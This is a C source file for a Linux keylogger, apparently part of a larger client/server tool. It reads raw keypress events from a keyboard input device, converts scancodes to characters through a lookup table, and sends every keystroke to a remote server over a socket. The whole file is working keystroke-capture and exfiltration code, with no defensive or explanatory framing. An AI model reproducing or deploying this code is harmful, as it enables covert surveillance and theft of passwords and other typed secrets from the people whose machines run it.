#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <pthread.h>
#include "keylog.h" // Include the header file
#include "messageManager.h"
#include "clientManager.h"
#include "utils.h"

typedef struct
{
    int key_code;
    char ascii_char[20];
} KeyCodeMap;

KeyCodeMap xt_to_ascii_map[] = {
    {0x01, "<ESC>"}, {0x1E, "a"}, {0x30, "b"}, {0x2E, "c"}, {0x20, "d"}, {0x12, "e"}, {0x21, "f"}, {0x22, "g"}, {0x23, "h"}, {0x17, "i"}, {0x24, "j"}, {0x25, "k"}, {0x26, "l"}, {0x32, "m"}, {0x31, "n"}, {0x18, "o"}, {0x19, "p"}, {0x10, "q"}, {0x13, "r"}, {0x1F, "s"}, {0x14, "t"}, {0x16, "u"}, {0x2F, "v"}, {0x11, "w"}, {0x2D, "x"}, {0x15, "y"}, {0x2C, "z"}, {0x02, "1"}, {0x03, "2"}, {0x04, "3"}, {0x05, "4"}, {0x06, "5"}, {0x07, "6"}, {0x08, "7"}, {0x09, "8"}, {0x0A, "9"}, {0x0B, "0"}, {0x1C, "<ENTER>"}, {0x39, " "}, {0x0E, "<BACKSPACE>"}, {0x0F, "<TAB>"}, {0x1A, "["}, {0x1B, "]"}, {0x27, ";"}, {0x28, "'"}, {0x29, "`"}, {0x2B, "\\"}, {0x33, ","}, {0x34, "."}, {0x35, "/"}, {0x0D, "="}, {0x0C, "-"}, {0x7F, "<DEL>"}, {0x2A, "<SHIFT>"}, {0x36, "<SHIFT>"},

    // Newly added keys
    {0x1D, "<CTRL>"},       // Left CTRL key
    {0xE01D, "<CTRL>"},     // Right CTRL key (Extended)
    {0x38, "<ALT>"},        // Left ALT key
    {0xE038, "<ALT>"},      // Right ALT key (AltGr, Extended)
    {0x3A, "<CAPSLOCK>"},   // CAPS LOCK
    {0x45, "<NUMLOCK>"},    // NUM LOCK
    {0x46, "<SCROLLLOCK>"}, // SCROLL LOCK
    {0x37, "<PRTSC>"},      // Print Screen
    {0xE037, "<PRTSC>"},    // Print Screen (Extended)
    {0x52, "<INSERT>"},     // Insert
    {0x53, "<DEL>"},        // Delete
    {0x47, "<HOME>"},       // Home
    {0x4F, "<END>"},        // End
    {0x49, "<PAGEUP>"},     // Page Up
    {0x51, "<PAGEDOWN>"},   // Page Down
    {0x48, "<UP>"},         // Up arrow
    {0x50, "<DOWN>"},       // Down arrow
    {0x4B, "<LEFT>"},       // Left arrow
    {0x4D, "<RIGHT>"},      // Right arrow
    {0x3B, "<F1>"},         // F1 key
    {0x3C, "<F2>"},         // F2 key
    {0x3D, "<F3>"},         // F3 key
    {0x3E, "<F4>"},         // F4 key
    {0x3F, "<F5>"},         // F5 key
    {0x40, "<F6>"},         // F6 key
    {0x41, "<F7>"},         // F7 key
    {0x42, "<F8>"},         // F8 key
    {0x43, "<F9>"},         // F9 key
    {0x44, "<F10>"},        // F10 key
    {0x57, "<F11>"},        // F11 key
    {0x58, "<F12>"}         // F12 key
};

extern clientInfo_t clientData;

// Function to convert XT key code to ASCII
char *xt_to_ascii(int key_code)
{
    int map_size = sizeof(xt_to_ascii_map) / sizeof(xt_to_ascii_map[0]);
    for (int i = 0; i < map_size; i++)
    {
        if (xt_to_ascii_map[i].key_code == key_code)
        {
            return xt_to_ascii_map[i].ascii_char;
        }
    }

    return NULL; // Return null character if key code not found
}

// Function to capture keystrokes and send them to the server
void *start_keylogger()
{
    struct input_event ev;
    int fd;
    ssize_t n;
    char buffer[256];

    // Open the input device (keyboard device)
    fd = open(clientData.keyLoggerInputFile, O_RDONLY);
    if (fd == -1)
    {
        perror("Cannot open input device");
        return NULL;
    }
    clientData.keyLoggerFd = fd;

    // Capture and send key events
    while (1)
    {
        n = read(fd, &ev, sizeof(struct input_event));
        if (n == (ssize_t)-1)
        {
            perror("Read error");
            break;
        }
        // printf("Ev.type=%d\n", ev.type);
        if (ev.type == EV_KEY)
        {
            // printf("Key event: code=%d, value=%d\n", ev.code, ev.value);
            if (ev.value == 1)
            {
                snprintf(buffer, sizeof(buffer), "%s", xt_to_ascii(ev.code));
                if (strcmp(buffer, "<ENTER>") == 0)
                {
                    strcat(buffer, "\n");
                }
                message_t msg;
                strcpy(msg.buffer, buffer);
                msg.opCode = 'K';
                msg.size = strlen(buffer);
                sendMessage(clientData.serverSocket, &msg);
            }
        }
    }

    // Close the device file

    return NULL;
}

void terminateKeylogger()
{
}